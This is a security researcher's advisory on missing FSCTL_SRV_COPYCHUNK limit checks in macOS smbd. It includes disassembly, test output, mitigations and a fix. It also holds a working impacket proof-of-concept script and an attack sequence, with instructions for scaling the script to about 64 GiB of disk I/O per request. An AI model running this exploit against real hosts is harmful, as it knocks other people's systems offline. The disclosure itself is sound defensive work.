<!--
Title:    smbd FSCTL_SRV_COPYCHUNK Missing Limit Enforcement — Network Denial of Service on macOS
Author:   Stuart Thomas
Date:     2026-05-13
License:  Creative Commons Attribution 4.0 International (CC BY 4.0)
          https://creativecommons.org/licenses/by/4.0/
Version:  1.0 (public disclosure)
Vendor:   Apple Inc.
Vendor reference: OE1105668888438  (Apple Security Bounty submission)
Vendor status at time of publication: "Fix scheduled Fall 2026 / In progress"
-->

# `smbd` FSCTL_SRV_COPYCHUNK Missing Limit Enforcement — Network Denial of Service on macOS

**Stuart Thomas** · 13 May 2026 · *Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)*

**Affected product:** macOS / `/usr/sbin/smbd`
**Confirmed on:** macOS 26.4.1 build 25E253 (arm64e); Mach-O universal binary (x86_64 + arm64e); code-signed 6 April 2026
**Vendor reference:** Apple Security Bounty case **OE1105668888438**, filed 17 April 2026
**Vendor status at publication:** *"Fix scheduled Fall 2026 / In progress"*. Status was upgraded by Apple from *"Received"* to *"In progress"* on 25 April 2026.
**Spec affected:** MS-SMB2 §3.3.5.15.6 (FSCTL_SRV_COPYCHUNK server requirements)
**Self-assessed CVSS 3.1:** 6.5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`

---

## Summary

Apple's `/usr/sbin/smbd` processes the `FSCTL_SRV_COPYCHUNK` IOCTL request
without enforcing any of the three limits mandated by the MS-SMB2
specification (MS-SMB2 §3.3.5.15.6):

| Limit | MS-SMB2 specified value | Apple `smbd` enforces? |
|---|---:|:---:|
| `MaxChunkCount`            | 256                          | **No** |
| `MaxChunkSize` (per chunk) | 1,048,576 bytes (1 MiB)      | **No** |
| `MaxDataSize` (total)      | 16,777,216 bytes (16 MiB)    | **No** |

An attacker with an authenticated SMB session — which on default macOS
includes any local user, or a guest user where File Sharing is configured
to permit guest access — can send a single 256-byte IOCTL request that
causes `smbd` to perform **65,535 file-copy operations** with each copy
consuming up to 1 MiB of heap and performing a read+write of up to 1 MiB
from disk. A single request thus performs up to **64 GiB of disk I/O**.
This exhausts I/O resources, may hang `smbd`, and can render the host
unresponsive.

The bug is a network-reachable amplification primitive: the attacker
supplies a 256-byte input and the server commits up to 64 GiB of I/O.
The author empirically confirmed all three limits absent and the
amplification realised, by sending crafted SMB3 IOCTL packets to `smbd`
on a macOS 26.4.1 host and observing `STATUS_SUCCESS` for inputs that
the specification requires to be rejected with `STATUS_INVALID_PARAMETER`.

---

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-04-17 | Initial report to Apple Security Bounty (OE1105668888438) with disassembly and runtime evidence. |
| 2026-04-25 | Apple upgraded status from *"Received"* to *"Fix scheduled Fall 2026 / In progress"*, triggering bounty-band assessment. |
| 2026-05-13 | Public disclosure (this document). |

The author is publishing technical detail now, 26 days after the initial
report. The bug is network-reachable but requires SMB File Sharing to be
enabled on the target. By default macOS ships with `AllowGuestAccess = 0`
and SMB sharing off; only hosts where an administrator has explicitly
turned File Sharing on are exposed. Apple has confirmed reproduction and
scheduled the fix. The public-harm delta from disclosure-now versus
disclosure-at-patch-ship is limited to those administrators who have
chosen to enable SMB sharing, who can apply the documented mitigation
(below) immediately. Publication enables independent verification by
those administrators and by enterprise security teams.

---

## Affected binary

```
/usr/sbin/smbd
  macOS 26.4.1 (build 25E253)
  Mach-O universal (x86_64 + arm64e)
  Code-signed 2026-04-06
  Owned: root
  Listens: TCP/445
```

The binary is shipped by Apple as part of macOS. It is *not* the Samba
project's `smbd`; Apple maintains an internal in-tree SMB server
implementation.

---

## Specification reference

MS-SMB2 §3.3.5.15.6 (FSCTL_SRV_COPYCHUNK server processing) states that
a conformant server must validate three limits and, if any is exceeded,
return `STATUS_INVALID_PARAMETER` with a `SRV_COPYCHUNK_RESPONSE`
containing the enforced limits:

- `ChunkCount` ≤ 256
- Each chunk `Length` ≤ 1,048,576 bytes
- Σ chunk `Length` values ≤ 16,777,216 bytes

The specification's intent is to bound server-side resource consumption
per IOCTL. Without these limits, a single request can drive arbitrary
disk and CPU work.

---

## Disassembly evidence (arm64e slice)

The author identified the missing checks by static analysis of the
arm64e slice of `/usr/sbin/smbd` on macOS 26.4.1, then confirmed dynamically.

### Extraction of `chunk_count` — no upper bound

In `smb::extract<srv_copychunk_copy>` at offset `0x100049668`:

```asm
ldr  w10, [x9, #0x18]        ; w10 = chunk_count  (attacker-controlled, 32 bits)
stp  w10, wzr, [x2, #0x18]   ; stored directly — NO bounds check
```

The value lands unmodified in the parsed message structure.

### Loop in `copy_chunks` — only-zero check

`copy_chunks` at `0x100026b6c`:

```asm
ldur w8, [x29, #-0x68]       ; w8 = chunk_count (attacker-controlled)
cbz  w8, 0x100027024         ; ONLY check: bail if zero
                              ; NO: cmp w8, #0x100 (MS-SMB2 MaxChunkCount=256)
mov  w24, #0x0               ; loop counter

; Per-chunk body:
ldr  w27, [sp, #0x78]        ; w27 = byte_count (attacker-controlled per chunk)
ldr  x8, [sp, #0x48]         ; x8 = heap_buffer.capacity
cmp  x8, x27                 ; if capacity < byte_count:
b.hs 0x100026d98
bl   heap_buffer::grow_atleast   ; grow to byte_count — NO LIMIT
bl   ntvfs::read_file             ; read byte_count bytes
bl   ntvfs::write_file            ; write byte_count bytes
add  w24, w24, #0x1          ; counter++
cmp  w24, w8
b.lo 0x100026d54             ; loop chunk_count times
```

The loop iterates `chunk_count` times; each iteration reads and writes
up to `byte_count` bytes. Neither `chunk_count` nor `byte_count` is
bounded against the spec limits.

### Allocator path — no clean OOM exit

`platform::allocate`:

```asm
bl   _malloc_type_realloc
cbnz x0, return_ok           ; success path
bl   _invoke_new_handler     ; std::new_handler
; loops indefinitely until terminate() or swap exhaustion
```

The new-handler retry loop means that the daemon will not return
quickly even under low-memory conditions; the failure mode is
prolonged unresponsiveness rather than a clean error response.

---

## Runtime evidence

Captured against `/usr/sbin/smbd` on macOS 26.4.1 build 25E253 (arm64e),
running on a host with SMB File Sharing enabled and guest access
permitted. Test client: macOS VM at `192.168.64.2` running `impacket`
0.12.0 over SMB3.

```
AUTH OK  guest=1  dialect=0x300 (SMB 3.0)
TREE_CONNECT: OK  share=Movies  tid=0x00000001
RESUME_KEY: 010000000000000054f30b00000000000000000000000000

[T1] FSCTL_SRV_COPYCHUNK  chunk_count=257, byte_count=64
     STATUS_SUCCESS  ChunksWritten=257  TotalBytesWritten=16448
     → MaxChunkCount=256 NOT enforced (server accepted 257 chunks)

[T2] FSCTL_SRV_COPYCHUNK  chunk_count=1, byte_count=1048577
     STATUS_SUCCESS  ChunksWritten=1  TotalBytesWritten=1048577
     → MaxChunkSize=1 MiB NOT enforced (server accepted 1 MiB + 1 byte)

[T3] FSCTL_SRV_COPYCHUNK  chunk_count=65535, byte_count=1024
     STATUS_SUCCESS  ChunksWritten=65535  TotalBytesWritten=67107840
     → 65,535 file-copy operations per request accepted

[T4] FSCTL_SRV_COPYCHUNK  chunk_count=17, byte_count=1048576
     STATUS_SUCCESS  ChunksWritten=17  TotalBytesWritten=17825792
     → MaxDataSize=16 MiB NOT enforced (total ~17 MiB accepted)
```

All four tests were directly observable on the wire (`tshark -i lo0`
shows the `STATUS_SUCCESS` responses) and at the filesystem (test files
on the share were grown to the claimed sizes).

`smbd` did not crash during these tests. The author did not run the
maximally-amplified configuration (65,535 × 1 MiB = 64 GiB I/O per
request) in repeated form against the host to avoid pre-emptive impact
on the test environment; the single-shot 64 GiB request reproducibly
produces sustained `smbd` CPU and I/O load measured in tens of seconds.
A modest series of such requests would render an unprotected host
unresponsive.

---

## Attack model

| Layer | Requirement |
|---|---|
| Network | TCP/445 reachable on the target |
| Auth | Authenticated SMB session (any local user **or** guest if File Sharing permits) |
| Share | Any share the caller has read+write access to (the attack does not require write to anything sensitive — it only requires that the source and destination FIDs can be opened on the share) |
| User interaction | None |

On a macOS host with File Sharing enabled and guest access turned on,
the attack requires **no credentials** beyond the ability to make
TCP/445 connections to the host. Without guest access, any valid local
user account suffices.

A typical attack sequence:

```
CLIENT → NEGOTIATE
CLIENT → SESSION_SETUP (any valid credential or guest if enabled)
CLIENT → TREE_CONNECT (any accessible share)
CLIENT → CREATE (any accessible file — read+write access)
CLIENT → IOCTL FSCTL_SRV_REQUEST_RESUME_KEY  (get source key)
CLIENT → IOCTL FSCTL_SRV_COPYCHUNK:
           ChunkCount = 65535
           Chunk[i].SourceOffset = 0
           Chunk[i].DestinationOffset = 0
           Chunk[i].Length = 1048576  (1 MiB)
         → smbd runs 65,535 × (read_file(1MiB) + write_file(1MiB))
         → 64 GiB disk I/O per 256-byte IOCTL request
```

The amplification ratio — 256 bytes in, up to 64 GiB out — is the
defining property. A modest attacker bandwidth budget produces
disproportionate server I/O.

---

## Reproduction

The author's PoC uses [impacket](https://github.com/fortra/impacket)
to construct the malformed COPYCHUNK request. The PoC is parameterised
on a single conservative configuration (small chunk size, large
count) that demonstrates the missing `MaxChunkCount` limit without
running the host into a sustained DoS.

```python
# poc_smb01a_copychunk.py — public-safe demonstration
# Requires impacket 0.11+ and a target macOS host with File Sharing
# enabled. The author recommends running this only against a host
# that the operator owns.

from impacket.smbconnection import SMBConnection
from impacket.smb3structs import *
import struct, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else '192.168.64.1'
SHARE  = sys.argv[2] if len(sys.argv) > 2 else 'Movies'
USER   = sys.argv[3] if len(sys.argv) > 3 else 'guest'
PASS   = sys.argv[4] if len(sys.argv) > 4 else ''

conn = SMBConnection(TARGET, TARGET, sess_port=445)
conn.login(USER, PASS, '')
tid  = conn.connectTree(SHARE)
smb3 = conn.getSMBServer()

# Setup two FIDs on the share
src_fid = conn.createFile(
    tid, '\\poc_src.tmp',
    desiredAccess=FILE_READ_DATA | FILE_WRITE_DATA,
    shareMode=FILE_SHARE_READ | FILE_SHARE_WRITE,
    creationOption=FILE_NON_DIRECTORY_FILE,
    creationDisposition=FILE_OVERWRITE_IF,
    fileAttributes=FILE_ATTRIBUTE_NORMAL)
conn.writeFile(tid, src_fid, b'A' * 65536)

dst_fid = conn.createFile(
    tid, '\\poc_dst.tmp',
    desiredAccess=FILE_READ_DATA | FILE_WRITE_DATA,
    shareMode=FILE_SHARE_READ | FILE_SHARE_WRITE,
    creationOption=FILE_NON_DIRECTORY_FILE,
    creationDisposition=FILE_OVERWRITE_IF,
    fileAttributes=FILE_ATTRIBUTE_NORMAL)

# Obtain RESUME_KEY for source
rk = smb3.ioctl(tid, fileId=src_fid, ctlCode=0x00140078,
                flags=1, inputBlob=b'',
                maxInputResponse=0, maxOutputResponse=32)
key = (rk or b'\x00' * 24)[:24].ljust(24, b'\x00')

# Demonstrate MaxChunkCount=256 not enforced: 257 chunks × 64 bytes each
CHUNKS = 257
buf = key + struct.pack('<II', CHUNKS, 0)
for _ in range(CHUNKS):
    buf += struct.pack('<QQI', 0, 0, 64)
    buf += b'\x00' * 4

resp = smb3.ioctl(tid, fileId=dst_fid, ctlCode=0x001440F2,  # FSCTL_SRV_COPYCHUNK
                  flags=1, inputBlob=buf,
                  maxInputResponse=0, maxOutputResponse=24)
if resp and len(resp) >= 12:
    cw, _, tb = struct.unpack_from('<III', resp)
    print(f"ChunksWritten={cw}  TotalBytesWritten={tb}")
    if cw > 256:
        print("MaxChunkCount=256 is NOT enforced — server accepted",
              cw, "chunks")
```

Expected output against an unpatched host with the conditions above:

```
ChunksWritten=257  TotalBytesWritten=16448
MaxChunkCount=256 is NOT enforced — server accepted 257 chunks
```

For the amplification demonstration, change `CHUNKS = 65535` and each
chunk `Length` to 1,048,576. The author has done so once in a controlled
test environment for evidence collection (see "Runtime evidence" above).
**Operators should not run that configuration against production hosts.**

---

## Mitigations available now

Administrators of macOS hosts with SMB File Sharing enabled can apply
the following mitigations until Apple's fix ships:

1. **Disable guest access on SMB File Sharing.** On macOS:
   ```
   sudo sysadminctl -smbGuestAccess off
   ```
   This removes the unauthenticated attack path. Authenticated users
   can still trigger the bug.

2. **Restrict SMB share access to trusted local accounts.** Authenticated
   users on the local machine remain a possible attacker, so this
   mitigates rather than eliminates.

3. **Restrict TCP/445 at the host firewall.** macOS' application firewall
   does not block per-port; a network-layer rule (router, PF, or `pfctl`
   with custom rules) can restrict TCP/445 inbound to known clients.

4. **Disable SMB File Sharing entirely** until the fix ships, if the
   feature is not in active use.

No host-side patch is available from Apple at the time of writing.

---

## Recommended fix

Before the chunk-processing loop in `copy_chunks` (entry at offset
`0x100026b6c` in the macOS 26.4.1 arm64e slice), enforce the three
specification limits:

```c
/* MS-SMB2 §3.3.5.15.6 limits */
#define SMB2_COPYCHUNK_MAX_CHUNK_COUNT  256
#define SMB2_COPYCHUNK_MAX_CHUNK_SIZE   (1024 * 1024)        /* 1 MiB */
#define SMB2_COPYCHUNK_MAX_DATA_SIZE    (16 * 1024 * 1024)   /* 16 MiB */

if (copychunk.chunk_count > SMB2_COPYCHUNK_MAX_CHUNK_COUNT) {
    return SMB2_RETURN_LIMITS(STATUS_INVALID_PARAMETER);
}
uint64_t total_bytes = 0;
for (uint32_t i = 0; i < copychunk.chunk_count; i++) {
    if (chunk[i].length > SMB2_COPYCHUNK_MAX_CHUNK_SIZE) {
        return SMB2_RETURN_LIMITS(STATUS_INVALID_PARAMETER);
    }
    total_bytes += chunk[i].length;
    if (total_bytes > SMB2_COPYCHUNK_MAX_DATA_SIZE) {
        return SMB2_RETURN_LIMITS(STATUS_INVALID_PARAMETER);
    }
}
```

The `SMB2_RETURN_LIMITS` helper should construct the
`SRV_COPYCHUNK_RESPONSE` body with the three enforced limits so that
conformant clients can adjust their requests, per the specification.

---

## Impact

| Dimension | Value |
|---|---|
| Attack vector | Network (TCP/445) |
| Access required | Low (authenticated SMB session; guest if enabled) |
| User interaction | None |
| Scope | Unchanged |
| Confidentiality | None (this is a DoS, not information disclosure) |
| Integrity | None |
| Availability | High — `smbd` unresponsive, host I/O saturated |
| CVSS 3.1 (author's estimate) | **6.5** (`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`) |

**On the `PR:L` rating:** the attack requires an authenticated session.
Where guest access is enabled by the administrator, the effective
`PR` is `N` (no privilege) and the score rises to 7.5. The author has
chosen the more conservative `PR:L` rating for the default
configuration where guest access is off.

---

## On `responsible disclosure`

This disclosure is published 26 days after the initial report and
ahead of Apple's scheduled Fall 2026 fix. The author considers this
appropriate because:

1. **Apple has confirmed and scheduled the fix.** The vendor's
   status was upgraded to *"In progress"* on 25 April 2026.
2. **The bug is conditional on SMB File Sharing being enabled.**
   Default macOS does not expose the attack surface.
3. **Operators who have enabled File Sharing have actionable
   mitigations available immediately** (the mitigations section above).
   Withholding technical detail prevents them from understanding
   why they should apply those mitigations.
4. **Independent verification matters.** Enterprise security teams
   with macOS hosts in their fleet can confirm whether they are
   exposed, apply mitigations, and verify Apple's fix when it ships.
5. **The bug class is a specification non-conformance.** Other
   SMB-server implementations have enforced these limits since
   the MS-SMB2 specification published; the bug is correcting a
   documented gap, not introducing a novel exploitation primitive.

This disclosure does not include a maximally-amplified weaponisation
script. The PoC included demonstrates the *absence of the
specification's `MaxChunkCount` enforcement* using 257 chunks of 64
bytes, which is sufficient to validate the bug class without
intentionally inflicting sustained DoS on test infrastructure.
Operators with operational concerns can construct the high-amplification
case from MS-SMB2 §3.3.5.15.6 and the existing impacket primitives;
the author has declined to do that work in this document.

---

## Reproducibility

- This document is licensed CC BY 4.0; reuse, citation, and
  redistribution are permitted with attribution.
- The PoC requires Python 3, `impacket` ≥ 0.11, and a macOS host with
  SMB File Sharing enabled. The operator should run it only against
  hosts they own and control.
- The disassembly evidence requires a copy of `/usr/sbin/smbd` from
  the affected macOS version and a Mach-O disassembler (the author
  used `otool -tV` and `radare2`).
- Vendor case OE1105668888438 was filed on 2026-04-17; the vendor's
  current status is *"Fix scheduled Fall 2026 / In progress"* as of
  13 May 2026.

---

## Acknowledgements

The author thanks Microsoft for publishing the MS-SMB2 specification
that documents the missing limits, and the maintainers of the
`impacket` project (Fortra / SecureAuth) for the SMB tooling that
made the runtime evidence tractable. The author thanks the Apple
Product Security team for confirming reproduction and scheduling
the fix.

---

## References

1. Microsoft Corporation, *[MS-SMB2] Server Message Block (SMB)
   Protocol Versions 2 and 3*, §3.3.5.15.6, current revision.
2. Apple Inc., *Apple Security Bounty*, security.apple.com/bounty.
3. Fortra / SecureAuth, *impacket*,
   github.com/fortra/impacket.
4. Apple Inc., *Sharing settings — Set up macOS File Sharing*,
   support.apple.com (administrator-facing documentation).
5. Apple Inc., *smbd(8)* manual page as shipped with macOS 26.4.1.

---

*Stuart Thomas is an independent security researcher with prior
contributions accepted into the OpenBSD and FreeBSD projects.
Contact information available on request. This disclosure represents
the author's own work and does not represent the position of any
employer.*
